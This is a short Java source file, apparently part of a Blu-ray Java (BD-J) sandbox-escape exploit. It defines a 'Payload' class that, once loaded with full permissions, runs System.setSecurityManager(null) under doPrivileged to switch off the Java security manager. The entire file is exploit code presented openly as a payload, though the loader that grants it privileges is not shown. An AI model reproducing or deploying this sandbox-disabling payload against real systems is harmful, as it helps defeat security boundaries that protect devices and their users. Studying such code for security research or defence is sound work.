/*
 * Copyright (C) 2021 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

package org.bdj.sandbox;

import java.security.AccessController;
import java.security.PrivilegedActionException;
import java.security.PrivilegedExceptionAction;

/** Payload class that is loaded with all permissions in order to disable the security manager. */
public class Payload implements PrivilegedExceptionAction {
  private Payload() {
  }

  public Object run() {
    System.setSecurityManager(null);
    return System.getSecurityManager();
  }

  public static SecurityManager execute() throws PrivilegedActionException {
        return (SecurityManager) AccessController.doPrivileged(new Payload());
  }
}
